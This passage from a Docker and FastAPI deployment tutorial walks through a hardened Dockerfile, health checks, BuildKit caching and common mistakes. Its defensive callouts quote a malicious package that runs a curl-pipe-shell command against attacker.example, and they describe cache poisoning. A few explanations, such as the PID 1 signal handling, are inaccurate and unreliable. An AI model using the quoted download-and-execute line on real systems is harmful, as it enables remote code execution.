- PID 1 in a Linux process tree has special responsibilities: it must `wait()` on orphaned child processes (whose parents died before reaping them) so they do not become zombies. The default Python `uvicorn` does not do this — it is a regular process that happens to be PID 1 in the container's PID namespace. Without `tini`, worker processes that `uvicorn` forks and that die abnormally become zombies forever.
- PID 1 also has special signal handling: the Linux kernel does *not* send the default `SIGTERM` handler to PID 1 (because PID 1 is supposed to be `init`, which sets up its own handlers). Without `tini`, `uvicorn` as PID 1 has to install its own `SIGTERM` handler — and Starlette's `lifespan.shutdown` only runs if `uvicorn` receives `SIGTERM` and translates it into the ASGI shutdown message. `tini` bridges this: it installs the default signal handlers (which it can, because it is *not* PID 1 in the host kernel — only in the container's PID namespace), receives `SIGTERM`, and forwards it to `uvicorn`.
- The `--` after `tini` means "everything after this is the command to run, not tini options." Without `--`, `tini` would try to parse `uvicorn` as its own flag.

**Why the exec (array) form:**

- `CMD ["uvicorn", ...]` is the *exec form* — Docker runs the binary directly, no shell. `uvicorn` is PID 1's child (well, `tini` is PID 1, `uvicorn` is its child).
- `CMD uvicorn ...` is the *shell form* — Docker runs `/bin/sh -c "uvicorn ..."`. `/bin/sh` becomes PID 1's child, and `uvicorn` becomes `/bin/sh`'s child. Now `SIGTERM` goes to `/bin/sh`, which does not forward it to `uvicorn`, and your container takes 10 seconds to die (the orchestrator's grace period) before being `SIGKILL`ed. **Always use the exec form.**

**Spot the bug — what happens if you write `ENTRYPOINT ["python"]` and `CMD ["uvicorn", ...]`?**

Answer: the container runs `python uvicorn ...`, which tries to import `uvicorn` as a Python module (not run the `uvicorn` binary). It fails with `ModuleNotFoundError: No module named 'uvicorn'` if the venv is not on `PATH` for the `python` invocation, or — worse — it runs the venv's `uvicorn` *package's* `__main__` if there is one. The fix is `ENTRYPOINT ["/usr/bin/tini", "--"]` (just the init) and `CMD ["uvicorn", ...]` (the full command). The general rule: `ENTRYPOINT` is the *fixed* part of the command, `CMD` is the *variable* part. `tini` is fixed; the app server command is what you would change if you wanted to run with `--workers 4` or under `gunicorn`.


### Line 59: `EXPOSE`

```dockerfile
EXPOSE 8000
```

**What it does:** Documents that the container listens on port 8000.

**Why this matters:**

- `EXPOSE` is *documentation*, not a port forward. It does not actually publish the port — you still need `docker run -p 8000:8000` (or `ports:` in compose) to forward a host port to the container port.
- Some orchestrators (Docker's `--link` legacy, Kubernetes' `containerPort`) read `EXPOSE` to populate metadata. It is good hygiene to declare it.
- The actual listening is done by `uvicorn --host 0.0.0.0 --port 8000`. If `uvicorn` listened on `127.0.0.1` (the default for some servers), nothing outside the container's network namespace could reach it — `EXPOSE` or no `EXPOSE`. The `--host 0.0.0.0` is the load-bearing line; `EXPOSE` is the comment.

### Lines 61–62: `HEALTHCHECK`

```dockerfile
# Healthcheck: hit /healthz every 30s. Three consecutive failures => unhealthy.
HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3 \
 CMD python -c "import urllib.request, sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:8000/healthz', timeout=3).status==200 else 1)"
```

**What it does:** Every 30 seconds (after a 15-second start period), Docker runs the `python -c ...` command. If it exits 0, the container is healthy; if it exits non-zero, the failure counter ticks. After three consecutive failures, the container is marked `unhealthy`.

**Why these arguments:**

- `--interval=30s` — poll every 30 seconds. Tight enough to catch a problem quickly, loose enough not to spam.
- `--timeout=5s` — if the `python` command does not exit in 5 seconds, kill it and count as a failure. Without a timeout, a hung healthcheck could run forever.
- `--start-period=15s` — for the first 15 seconds after container start, failures do *not* count. This is the grace period during which the lifespan startup runs and `/healthz` is not yet ready. Without it, a slow-starting app would be marked unhealthy and killed before it finished starting.
- `--retries=3` — three consecutive failures (not three in a row over the lifetime; three since the last success) are required to flip to unhealthy. This protects against transient blips.

**Why `python -c ...` instead of `curl http://...`:**

- `curl` is not in the slim image. Installing it would add about 5 MB and pull in a shell, libcurl, etc.
- `python` *is* in the slim image (it is the base). Using `python -c "import urllib.request..."` is free.
- The `urllib.request.urlopen` call has its own `timeout=3` — if the server does not respond in 3 seconds, the `urlopen` raises, the `python -c` exits non-zero, and the healthcheck fails. Belt and braces with the `--timeout=5s` of the `HEALTHCHECK` directive.

**Why `/healthz`, not `/readyz`:**

- `/healthz` is liveness — "the process is up and serving." It does not touch the DB. A transient DB blip does not make the container unhealthy, so the orchestrator does not kill it.
- `/readyz` is readiness — "the process can serve real traffic." It touches the DB. If the DB is down, `/readyz` fails, and the orchestrator stops routing traffic to this container (but does not kill it). When the DB comes back, `/readyz` succeeds, and traffic resumes.
- The Docker `HEALTHCHECK` corresponds roughly to liveness: it is asking "is this container alive, or do I need to restart it?" A failure means *restart*. If you put `/readyz` here, a DB blip would cause the orchestrator to restart all your containers, which would not fix the DB and would make the recovery slower. **`/healthz` for `HEALTHCHECK`; `/readyz` for the orchestrator's readiness probe.**

**Danger — Do not put database checks in `/healthz`.**

The single most common healthcheck mistake is to write `GET /healthz` that runs `SELECT 1` against the database. A short DB blip (a failover, a network partition, a slow query) then takes the container offline — the orchestrator kills it, the replacement container comes up, tries to connect to the still-recovering DB, fails its healthcheck, gets killed, and you have a cascading failure. The split between liveness (`/healthz`, no DB) and readiness (`/readyz`, with DB) exists precisely to prevent this. Liveness is "is the process itself alive"; readiness is "can it serve right now."


**Danger — How an attacker thinks: `/healthz` and `/readyz` are an unauthenticated oracle.**

The load balancer polls `/healthz` every 5 seconds and `/readyz` every 10 seconds — both endpoints are unauthenticated (the LB cannot easily sign its probes) and they are listed in the OpenAPI doc at `/docs`. An attacker scrapes `/docs`, finds the two endpoints, and uses them as a free reconnaissance signal: `/readyz` returning 500 across all replicas tells them the DB is down — the perfect window for a credential-stuffing burst against the auth endpoint (the rate limiter's Redis dependency is shared with the DB-tier's failover, so the limiter is also degraded); `/readyz` returning 200 with a 50 ms latency tells them which replica is the leader (the LB's round-robin is not observable, but per-replica latency IS observable through `/readyz` if it returns timing). Defence in depth: (a) `/healthz` and `/readyz` return ONLY `{"status":"ok"}` — never the DB connection string, never the version, never the upstream latency, never the migration revision; (b) rate-limit both at the load balancer (`limit_req_zone ... burst=10 nodelay` in Nginx) so a scraper gets 429s; (c) require an internal-only `X-Health-Check: <shared-secret>` header for `/readyz` — the LB sets it, an external attacker does not know it, and a request without it gets a 404 (not a 401 — 404 hides the endpoint's existence); (d) set `app = FastAPI(openapi_url=None)` (or `docs_url=None, redoc_url=None`) in production so `/docs` returns 404 and the scraper cannot enumerate routes. Verify with `curl -i https://api.boardly.example/healthz` — expect `200 {"status":"ok"}` and `Server: nginx` (never `Server: uvicorn` — that leaks the runtime); `curl -i https://api.boardly.example/docs` should return `404`. The [[11-Authentication-and-Security/Threat-Model-First]] + [[11-Authentication-and-Security/OWASP-API-Top-10]] + [[02b-Backend-Foundations/Health-Checks-and-Probes]] forward refs cover the threat-model-and-probe-hygiene story.


### Lines 64–79: The `main.py` and `/healthz` / `/readyz`

We covered the Dockerfile. The `main.py` is short: a `/healthz` that returns `{"status":"ok"}` without touching the DB, and a `/readyz` that runs `SELECT 1` through the session dependency.

**Why two endpoints:**

- The `HEALTHCHECK` polls `/healthz`. The orchestrator's readiness probe (in Kubernetes: `readinessProbe`) polls `/readyz`.
- `/healthz` answers: "is the Python process alive and the ASGI app accepting TCP connections?" If yes, the orchestrator keeps the container running. If no, the orchestrator kills and restarts it.
- `/readyz` answers: "is this container ready to receive real traffic?" If yes, the orchestrator routes traffic to it. If no, the orchestrator stops routing (but does not restart).
- The split means: DB down -> `/readyz` fails -> traffic stops -> container stays alive -> DB back -> `/readyz` succeeds -> traffic resumes. No restart, no cascade.

### Lines 81–91: The settings module

```python
class Settings(BaseSettings):
 model_config = SettingsConfigDict(env_prefix="APP_", env_file=".env")

 app_name: str = "boardly"
 database_url: str = "postgresql+asyncpg://boardly:__REDACTED__@postgres:5432/boardly"
 redis_url: str = "redis://redis:6379/0"
 log_level: str = "INFO"
```

**Why `__REDACTED__` in the default:**

- The default `database_url` is a placeholder. In production, the platform injects the real `APP_DATABASE_URL` env var; the default never ships a real password. Every example in this section uses `__REDACTED__` or `change-me` for any secret.
- See [[04-Pydantic/Pydantic-Settings]] for the full treatment of `BaseSettings`, `env_prefix`, and `env_file`.

## Execution Trace

Time to build and run. In your terminal:

```bash
docker build -t boardly:$(git rev-parse --short HEAD) .
```

What happens, in order:

1. **BuildKit parses the Dockerfile.** It reads the `# syntax=docker/dockerfile:1.7` directive, pulls the modern frontend, and resolves the two `ARG`s.
2. **Builder stage starts from `python:3.12.7-slim`.** If the image is not cached locally, BuildKit pulls it.
3. **`uv` is copied from `ghcr.io/astral-sh/uv:0.13.1`.** BuildKit pulls that image, extracts `/uv`, writes it to `/usr/local/bin/uv` in the builder's layer.
4. **`build-essential`, `libpq-dev`, `curl` are installed.** The apt layer is cached; on a rebuild, it is reused unless the `RUN` command itself changes.
5. **`pyproject.toml` and `uv.lock` are copied.** This layer's cache key is the hash of those two files.
6. **`uv sync --frozen --no-dev --no-install-project` populates `/app/.venv`.** Cached on the lockfile hash. On a rebuild where the lockfile did not change, this layer is reused in milliseconds.
7. **The source is copied** (`./boardly` and `./README.md`). This layer's cache key is the hash of those files. A one-line code change rebuilds from this layer forward — not from step 6.
8. **`uv sync --frozen --no-dev` installs the project itself** into the venv. Fast.
9. **Runtime stage starts from a fresh `python:3.12.7-slim`.** It does not inherit the builder's layers.
10. **`libpq5`, `ca-certificates`, `tini` are installed.** The non-root user `app` (UID 1000) is created in the same `RUN`.
11. **`/app/.venv` is copied from the builder.** This is the multi-stage cut: the runtime now has the venv but none of the build tools.
12. **The source is copied** (again — the builder's copy did not survive).
13. **`PATH` is set, `USER 1000` drops privileges.**
14. **`ENTRYPOINT` and `CMD` are recorded.** No layer is created; these are image metadata.
15. **`HEALTHCHECK` is recorded.** Also metadata.

**What happens inside BuildKit when you run `docker build`.**

BuildKit does not execute the Dockerfile line-by-line as a shell script. It: (1) parses the Dockerfile with the *frontend* specified by `# syntax=docker/dockerfile:1.7` (the frontend is itself a container image — BuildKit pulls it on first use and runs it as a separate process that translates Dockerfile instructions into a graph of *ops*); (2) constructs a directed acyclic graph (DAG) of ops — `COPY`, `RUN`, `FROM` are nodes, `ARG`/`ENV` are inputs to those nodes; (3) computes a content-hash for each node based on its inputs (for `COPY`, the hash of the source files; for `RUN`, the hash of the command string plus the hashes of the parent layers); (4) consults the local build cache (the BuildKit daemon's internal content-addressed store) — if a node with the same hash exists, the op is *skipped* and the cached output is reused; (5) for nodes that miss the cache, BuildKit creates a *snapshot* of the parent filesystem (copy-on-write), runs the op in a container with that snapshot mounted, and captures the filesystem diff as the new layer; (6) parallelises independent ops — if two `RUN` instructions are independent (e.g. installing `apt` packages in one stage and copying `uv` in another), BuildKit runs them concurrently; (7) the final image is a *manifest* — a JSON document listing the layers by digest, the config (USER, ENV, CMD, ENTRYPOINT, HEALTHCHECK), and the architecture — which `docker push` uploads to the registry as a manifest list (so the same tag can serve `linux/amd64` and `linux/arm64` variants). The senior engineer who knows this can answer: "why did my rebuild take 90 seconds when I only changed one line of code?" (because the change invalidated the cache from the `COPY ./boardly` step forward, and everything after — `uv sync` in the runtime stage, `COPY --from=builder`, etc. — re-ran; the fix is to move the source copy as late as possible, which this Dockerfile already does). They can also answer: "why is the image the same size on disk and in the registry?" (because layers are content-addressed and deduplicated — if your runtime stage's `python:3.12.7-slim` is the same digest as your builder's, the layers are shared between both stages in the local cache; the registry stores each layer once per digest, not once per image).


**Production reality: the BuildKit cache is a side-channel in shared CI.**

The lesson says "the local build cache is content-addressed" — true on a single developer's machine, dangerous on a shared CI runner. Build A's `RUN apt-get install libpq5` layer is reused by Build B if the `RUN` command string and the parent layer's hash match — even if Build B is a different repo. An attacker who gets a PR merged into a sibling repo on the same runner can plant a poisoned layer: their `RUN` writes a backdoored `libc.so.6` into the layer, and the next build that hits the same cache key inherits it. The image you ship is not the image your Dockerfile describes; it is the image your cache produced. Defence in depth: (a) release builds run `docker build --no-cache` — slower (no inheritance) but no poisoning surface; (b) `--cache-from=type=remote,ref=boardly/<sha>` and `--cache-to=type=remote,mode=max,ref=boardly/<sha>` so each repo has its own cache namespace, opt-in to cross-repo sharing; (c) generate an SBOM (`docker sbom IMAGE` or `syft IMAGE -o spdx-json`) and attach a Cosign signature (`cosign sign --key <key> IMAGE`) — the registry rejects unsigned images at deploy time; (d) the digest-pinned base image (`python:3.12.7-slim@sha256:abc...`) is the immutable floor — no cache inheritance changes the base, only the layers above it. Verify with `docker buildx imagetools inspect boardly:$(git rev-parse --short HEAD)` — the manifest lists every layer digest, and `cosign verify --key <pubkey> boardly:$(git rev-parse --short HEAD)` exits 0 before deploy. The [[12-Testing-and-Quality/CI-Pipelines]] + [[11-Authentication-and-Security/Threat-Model-First]] forward refs cover the supply-chain-attestation story.


Now run the image:

```bash
docker run --rm -p 8000:8000 --name boardly boardly:$(git rev-parse --short HEAD)
```

What happens, in order:

1. **The container's PID 1 is `/usr/bin/tini`.** Docker exec's `/usr/bin/tini -- uvicorn boardly.main:app --host 0.0.0.0 --port 8000` as UID 1000.
2. **`tini` exec's `uvicorn`.** `uvicorn` is now PID 1's child, running as UID 1000.
3. **`uvicorn` imports `boardly.main`.** The module-level code runs: `app = FastAPI(...)`, the `@app.get("/healthz")` and `@app.get("/readyz")` decorators register the routes.
4. **`uvicorn` binds `0.0.0.0:8000`.** The socket is listening; nothing is being served yet.
5. **`uvicorn` sends the ASGI `lifespan.startup` message.** If `boardly.main` had a `lifespan` function (it will in later lessons), it would run now: open the SQLAlchemy engine pool, ping Redis, set up OpenTelemetry. In this minimal app, lifespan is a no-op.
6. **`uvicorn` logs:**
 ```
 INFO: Started server process [1]
 INFO: Waiting for application startup.
 INFO: Application startup complete.
 INFO: Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
 ```
7. **After `start-period=15s`, Docker begins polling `/healthz`.** The first poll hits `GET http://127.0.0.1:8000/healthz` from inside the container. `uvicorn` receives the request, dispatches to `healthz()`, returns `{"status":"ok"}`. The `python -c` exits 0. Container marked healthy.
8. **In another terminal:**
 ```bash
 curl -sf http://localhost:8000/healthz
 ```
 You should see:
 ```json
 {"status":"ok"}
 ```
9. **You press `Ctrl+C` (or `docker stop`).** Docker sends `SIGTERM` to PID 1 (which is `tini`). `tini` forwards `SIGTERM` to its child (`uvicorn`). `uvicorn` receives `SIGTERM`, sends the ASGI `lifespan.shutdown` message, runs the shutdown half of any lifespan, drains in-flight requests, and exits. `tini` reaps `uvicorn`, then itself exits. Docker logs:
 ```
 INFO: Waiting for application shutdown.
 INFO: Application shutdown complete.
 INFO: Finished server process [1]
 ```

```mermaid
flowchart TB
 subgraph B["Builder stage (python:3.12.7-slim)"]
 B1["copy uv from<br/>ghcr.io/astral-sh/uv:0.13.1"]
 B2["apt: build-essential, libpq-dev, curl"]
 B3["COPY pyproject.toml, uv.lock"]
 B4["uv sync --frozen --no-dev --no-install-project<br/>(cached unless lockfile changes)"]
 B5["COPY ./boardly ./README.md"]
 B6["uv sync --frozen --no-dev<br/>(install project itself)"]
 B1 --> B2 --> B3 --> B4 --> B5 --> B6
 end
 subgraph R["Runtime stage (python:3.12.7-slim)"]
 R1["apt: libpq5, ca-certificates, tini"]
 R2["groupadd/useradd uid=1000"]
 R3["COPY --from=builder /app/.venv"]
 R4["COPY ./boardly"]
 R5["ENV PATH=/app/.venv/bin:..."]
 R6["USER 1000"]
 R7["ENTRYPOINT tini, CMD uvicorn"]
 R8["HEALTHCHECK /healthz"]
 R1 --> R2 --> R3 --> R4 --> R5 --> R6 --> R7 --> R8
 end
 B6 -. "venv only" .-> R3

 style B fill:#fff3cd,stroke:#856404
 style R fill:#d4edda,stroke:#28a745
 style B6 fill:#ffeeba,stroke:#856404
 style R3 fill:#cce5ff,stroke:#007bff
```

**You've just built and run a production-grade container.**

It is small (under 200 MB), it runs as UID 1000, it has a real `HEALTHCHECK`, it handles `SIGTERM` gracefully through `tini`, and it does not contain a C compiler or a package manager. This is the image the next three lessons will compose into a local dev stack, a CI pipeline, and a deploy job.


## Common Mistakes

### Mistake 1: `COPY . /app` before dependencies

```dockerfile
# WRONG
COPY . /app
WORKDIR /app
RUN uv sync --frozen --no-dev
```

**Symptom:** Every code change rebuilds the entire dependency layer. A `docker build` that should take 5 seconds takes 90.

**Why:** The cache key for the `uv sync` layer is the hash of everything that produced it — including all of your source files. A one-line change to `boardly/main.py` invalidates the cache.

**Fix:** Copy `pyproject.toml` and `uv.lock` first, run `uv sync --no-install-project`, then copy the source. The deps layer's cache key depends only on the lockfile.

### Mistake 2: Leaving `uv` in the runtime image

```dockerfile
# WRONG
FROM python:3.12-slim
COPY --from=ghcr.io/astral-sh/uv:0.13.1 /uv /usr/local/bin/uv
RUN uv sync --frozen --no-dev
CMD ["uvicorn", "boardly.main:app"]
```

**Symptom:** The runtime image contains `uv`, which can install arbitrary packages from PyPI. If an attacker escapes the app to the host, they have a Python package manager ready to install whatever they want.

**Fix:** Only copy `uv` into the *builder* stage. The runtime stage never installs `uv`. The artifact that crosses the stage cut is the *venv*, not the tool that built it.

**Danger — How an attacker thinks: `uv` (or `pip`) in the runtime image is a one-line supply-chain pivot.**

The naive Dockerfile ships `uv` into the runtime because the developer copied `COPY --from=ghcr.io/astral-sh/uv:0.13.1 /uv /usr/local/bin/uv` into the runtime stage "for debugging." An attacker who gets RCE inside the container (a deserialization bug in a route handler, an SSRF that reaches an internal admin endpoint, a misconfigured `--reload` in prod that lets a crafted file write arbitrary Python) now has a Python package manager ready to install whatever they want from PyPI: `uv pip install pycurl` to exfiltrate the app's secrets via outbound HTTPS to a paste site, `uv pip install <malicious-typo-squat>` whose `__init__.py` runs `os.system("curl attacker.example | sh")` at import time. The non-root `USER 1000` does not stop this — `app` can install packages into its own user-site (`~/.local/lib/python3.12/site-packages/`) or into a fresh venv it creates in `/tmp`. Defence in depth: (a) `uv` exists only in the builder stage — verify with `docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'which uv; which pip; which gcc; echo done'` returning empty `which` outputs before `done`; (b) a runtime seccomp profile (`--security-opt seccomp=<profile.json>`) that blocks the `socket(AF_INET, ...)` family for forks, preventing the exfiltration path; (c) an `Egress` NetworkPolicy that allows HTTPS only to the DB, Redis, and the LLM provider — everything else denied — so even a successful `uv pip install` cannot reach a paste site; (d) a read-only root filesystem (`--read-only` flag, with `--tmpfs /tmp` for the writable scratch) so the attacker cannot write a new venv anywhere except `/tmp`, which is wiped on container restart. Verify the egress with `docker run --rm --network boardly-prod boardly:$(git rev-parse --short HEAD) python -c "import socket; socket.create_connection(('attacker.example', 443), timeout=2)"` — expect a `TimeoutError` or `Connection refused`, not a successful handshake. The [[11-Authentication-and-Security/Threat-Model-First]] + [[11-Authentication-and-Security/OWASP-API-Top-10]] forward refs cover the threat model and the OWASP API1 (BOLA) and API8 (Security Misconfiguration) story.


### Mistake 3: `USER root` (or no `USER` directive)

```dockerfile
# WRONG
FROM python:3.12-slim
COPY . /app
CMD ["uvicorn", "boardly.main:app"]
```

**Symptom:** The container runs as `root`. The default UID of a Docker container is 0.

**Why it is bad:** See the `**Danger —**` callout above. A container escape lands as root on the host.

**Fix:** Create a non-root user, drop privileges with `USER 1000` (or whatever UID you chose), and `COPY --chown=app:app` so the files are owned by the right user.

### Mistake 4: Healthcheck that touches the DB

```dockerfile
# WRONG
HEALTHCHECK CMD python -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8000/readyz', timeout=3)"
```

**Symptom:** A short DB blip fails the healthcheck three times in a row, the container is marked unhealthy, the orchestrator kills it, the replacement container also fails, and you have a cascading failure.

**Fix:** The `HEALTHCHECK` hits `/healthz` (no DB). The orchestrator's readiness probe hits `/readyz` (with DB).

### Mistake 5: `curl`-based healthcheck

```dockerfile
# WRONG (and common)
RUN apt-get install -y curl
HEALTHCHECK CMD curl -sf http://127.0.0.1:8000/healthz || exit 1
```

**Symptom:** The image is 5 MB larger than it needs to be, and you have installed a shell and `libcurl` into the runtime.

**Fix:** Use `python -c "import urllib.request..."` — Python is already in the image. The healthcheck is free.

### Mistake 6: String-form `CMD`

```dockerfile
# WRONG
CMD "uvicorn boardly.main:app --host 0.0.0.0 --port 8000"
```

**Symptom:** `docker stop` takes 10 seconds (the default grace period) before the container is `SIGKILL`ed. The lifespan shutdown never runs. In-flight requests are dropped.

**Why:** String-form `CMD` runs under `/bin/sh -c "..."`. `/bin/sh` is PID 1's child; `uvicorn` is `/bin/sh`'s child. `SIGTERM` goes to `/bin/sh`, which exits without forwarding the signal. `uvicorn` keeps running until `SIGKILL`.

**Fix:** Use the exec form: `CMD ["uvicorn", "boardly.main:app", "--host", "0.0.0.0", "--port", "8000"]`.

### Mistake 7: Building `:latest`

```bash
# WRONG
docker build -t boardly:latest .
```

**Symptom:** Nobody knows which version is running in production. `:latest` floats; the image you built yesterday is not the image your colleague built today. Rollback is impossible because there is no previous tag to roll back to.

**Fix:** Tag with the git SHA (`boardly:$(git rev-parse --short HEAD)`), the semver (`boardly:v0.1.0`), and a readable branch-build tag (`boardly:main-42`). The orchestrator pins to a digest (`boardly@sha256:...`). Lesson 3's CI pipeline does this automatically.

**Warning — When production breaks: a deploy rolls out, 500 errors spike, what now?**

It's 3 AM. Your monitoring shows 500 errors on 30% of requests in the last 5 minutes. Don't panic. The senior engineer's response, in order: (1) **Check the deploy timeline.** Was there a deploy in the last 30 minutes? `kubectl rollout history deployment/boardly-api -n prod` (or `helm history boardly -n prod`). If yes — **roll back first, diagnose second**. The rollback takes 30 seconds; the diagnosis takes 30 minutes. `kubectl rollout undo deployment/boardly-api -n prod` (or `helm rollback boardly <previous-revision> -n prod`). The post-mortem can wait until the page is green; the customer-facing outage cannot. (2) **If no recent deploy**, the cause is a dependency. Check, in this order: Postgres (`SELECT count(*) FROM pg_stat_activity WHERE state='active';` — if it's near `max_connections`, you have a connection leak; check `SELECT count(*) FROM pg_stat_activity WHERE state='idle in transaction';` for abandoned transactions holding locks and a stalled `VACUUM`), Redis (`redis-cli INFO memory` and `INFO stats` — if `evicted_keys` is non-zero, you're over `maxmemory` and Redis is dropping keys, which may invalidate sessions or rate-limit counters), and any external provider (LLM, payments, email — check their status pages; `curl -sI https://status.stripe.com/` is faster than digging through your own logs). (3) **Check the kubelet events** on the affected pods: `kubectl describe pod <pod-name> -n prod | tail -40` — `OOMKilled`, `CrashLoopBackOff`, and `ImagePullBackOff` are the three you'll see most. `OOMKilled` means raise `resources.limits.memory`; `CrashLoopBackOff` means the container is exiting non-zero, read its logs with `kubectl logs <pod> --previous -n prod`; `ImagePullBackOff` means the registry is unreachable or rate-limiting — check your registry credentials and the `imagePullSecrets`. (4) **Only after rolling back or identifying the root cause should you start writing a post-mortem.** The post-mortem is not for blame; the question is "what system allowed this deploy to reach production?" The fix is almost always a CI check (run the test that would have caught it), a deployment guard (a canary with auto-rollback on error-rate spike), or a runbook update. A post-mortem that ends in "we'll be more careful next time" is a post-mortem that has learned nothing.


## Engineering Trade-Offs

- **`uv` from `ghcr.io/astral-sh/uv:0.13.1` vs. `pip install uv`.** The `ghcr.io` image is a single static binary and is the Astral-recommended install path. `pip install uv` works but pulls a Python wheel into the builder, doubling the install surface and coupling `uv` to the builder's Python.
- **`slim` vs. `alpine`.** `alpine` uses musl libc; many Python wheels are built for glibc and need recompilation, blowing up build time and image size (the `gcc` and `musl-dev` install is large, and you lose binary wheels for things like `pyca/cryptography`). `slim` is glibc and works with binary wheels on PyPI. Default to `slim` unless you have a specific reason for `alpine`.
- **One venv vs. `--system`.** A venv is more isolation; `--system` is one less copy step. We pick venv for the cleaner runtime (no `pip` in the runtime image) and because the venv is a single directory we can `COPY --from=builder` as a tree.
- **`gunicorn -k uvicorn.workers.UvicornWorker` vs. bare `uvicorn --workers N`.** `gunicorn` gives you a battle-tested process manager that does graceful reloads and worker recycling. Bare `uvicorn` is simpler and is the documented FastAPI path. Default to bare `uvicorn` for single-process-per-container (which is the common case — you scale by adding containers, not workers); use `gunicorn` only when you must run multiple worker processes per container (rare).
- **`HEALTHCHECK` vs. orchestrator-only probes.** Docker's `HEALTHCHECK` is one layer of health visibility. Kubernetes has its own `livenessProbe` and `readinessProbe`. They are not redundant: `HEALTHCHECK` is what `docker ps` shows and what `docker compose` uses for `depends_on: condition: service_healthy` (Lesson 2). The orchestrator's probes are what the orchestrator uses to make scheduling decisions. Use both.
- **Digest pinning vs. tag pinning.** Tag pinning (`python:3.12.7-slim`) is human-readable but the digest can change if the image is rebuilt (e.g. to pick up a security patch). Digest pinning (`python:3.12.7-slim@sha256:abc...`) is byte-for-byte reproducible but requires tooling (Renovate, Dependabot) to bump. In production, the CI pipeline should resolve the tag to a digest at build time and write the digest to a lockfile.

**Scalability thinking: the deploy pipeline is a system, not a script.**

At 10 deploys a month, a 90-second `docker build` is fine. At 100 deploys a day across 8 services (a CI matrix), 90 seconds × 8 × 100 = 20,000 seconds of build time per day — and that's wall-clock time per pipeline, not concurrency-adjusted. The senior architect's first move is **build-cache reuse**: a shared BuildKit cache (a `type=remote` cache pushed to your registry, or a self-hosted BuildKit daemon with `--cache-from`/`--cache-to`) means the `python:3.12.7-slim` pull and the `apt-get install` layer are computed once per *base-image-and-args hash*, not once per pipeline. The second move is **image-pull parallelism at deploy time**: a 5-replica rollout pulls the image 5 times; on a 200 MB image over a 1 Gbit/s node network, that's 8 seconds per pull, 40 seconds of pod-readiness delay before the new pods can serve. With a registry mirror (Harbor, an ECR pull-through cache, or `imagePullProgressDeadline` raised from the default 1 minute) and the image pre-pulled on a node pool (a `DaemonSet` that runs `crictl pull` on each node), the deploy is gated by container-startup time only (~5–10 seconds for lifespan startup). The third move is **image size as a budget**: every megabyte is a megabyte pulled on every deploy across every replica, every region, every disaster-recovery failover. A 200 MB image at 50 replicas × 3 regions × daily-deploy is 30 GB of egress per day just for pulls — at typical cloud egress pricing, that is real money. The senior engineer sets an image-size budget (say, 250 MB) and a CI check that fails the build if the image exceeds it. The fourth move is **multi-arch builds**: `docker buildx build --platform=linux/amd64,linux/arm64` produces a manifest list so the same tag runs on x86 nodes and on Graviton (ARM) nodes; you don't ship "an amd64 image" and "an arm64 image" with separate tags — you ship one tag and the runtime pulls the right variant. The fifth move is **layer deduplication across services**: if `boardly-api` and `boardly-worker` both start from `python:3.12.7-slim` and both install `libpq5`, the layers are content-addressed and the registry stores them once; if you let each service drift to a different base image, you pay the storage and pull cost twice. The senior engineer asks "what is the *next* bottleneck, and how do I prepare for it before it hits?" — at 10 deploys/day the answer is "nothing"; at 100 deploys/day it is "cache reuse and registry mirror"; at 1,000 deploys/day it is "multi-arch, deduplication, and pre-pulling."


## Exercises

- **Beginner:** Build the image and run `docker image inspect boardly:<sha> --format '{{.Config.User}} {{.Os}} {{.Architecture}}'`. Verify it prints `1000 linux amd64` (or your arch). Then run `docker run --rm --entrypoint sh boardly:<sha> -c 'which pip; which uv; which gcc'` — expect all three to print `not found`. If any of them are found, you have a leak from the builder into the runtime; find it.
- **Intermediate:** Modify the `Dockerfile` so the healthcheck uses `/readyz` only after `start-period`, and `/healthz` before it. (Hint: you need a shell script that decides which to call based on a flag set at startup.) Explain why this is sometimes the right thing to do and often the wrong thing.
- **Advanced:** Add a `RUN --mount=type=cache,target=/root/.cache/uv` to the `uv sync` step so that even a `pyproject.toml` change does not have to re-download wheels from PyPI. Measure the difference in build time on a cold cache. Then add `RUN --mount=type=cache,target=/var/cache/apt` to the apt install — same idea. Document the trade-off: the cache is shared across builds on the same builder host, which is a win for CI but a problem for reproducibility (the cache content is not part of the image).

**Exercise 4 — Package-manager audit.** The runtime image must contain no `pip`, no `uv`, no `gcc`, no `curl`. Verify: `docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'for tool in pip uv pip3 gcc curl make; do command -v $tool || echo "MISSING: $tool"; done'` — every line should read `MISSING: <tool>`. Then `docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'ls /usr/local/bin/'` — assert `uv` and `pip` are NOT in the listing. If any tool is found, you have a leak from the builder into the runtime; find the `COPY --from=builder` that pulled it in. The defence belongs in the Dockerfile, not in a runtime check — see Mistake 2 above.

**Exercise 5 — Layer-cache audit.** Touch `boardly/main.py` (add a comment), rebuild, and assert the deps layer is CACHED. Verify: `docker build -t boardly:cache-test --progress=plain . 2>&1 | rg -c 'CACHED'` should be `>= 4` (apt, uv copy, deps sync, project install). Then break the cache by editing `uv.lock` (change a dep's version), rebuild, and assert `rg -c 'CACHED'` drops to `< 2` (only the apt and uv-copy layers survive). Then `docker build --no-cache -t boardly:cold .` — assert `rg -c 'CACHED'` is `0`. Document the wall-clock cost of each. The cache-key invariant is "deps layer caches on the lockfile hash, not on source" — verify it by editing only `boardly/main.py` and confirming the deps layer's hash is unchanged. The [[16-Deployment-and-DevOps/GitHub-Actions-CI]] forward ref covers the CI-grade cache-reuse story.

**Exercise 6 — SIGTERM handling.** Start the container, send SIGTERM, and assert graceful shutdown. Verify: `docker run --rm -d -p 8000:8000 --name sigtest boardly:$(git rev-parse --short HEAD)`; wait 20 s for the start-period; `docker stop --signal=TERM --time=15 sigtest`; `docker logs --tail=50 sigtest 2>&1 | rg 'Application shutdown complete'` should match. Then rebuild with the string-form `CMD "uvicorn boardly.main:app --host 0.0.0.0 --port 8000"` (the bug from Mistake 6), repeat the test, and assert `rg 'Application shutdown complete'` does NOT match (the SIGTERM is eaten by `/bin/sh`). The fix is the exec form `CMD ["uvicorn", ...]` — verify the test passes again after the fix. The [[02-Web-and-HTTP/ASGI-Starlette-Uvicorn]] + [[03-FastAPI-Core/Application-and-Lifespan]] forward refs cover the ASGI-shutdown-message and lifespan-contract story.

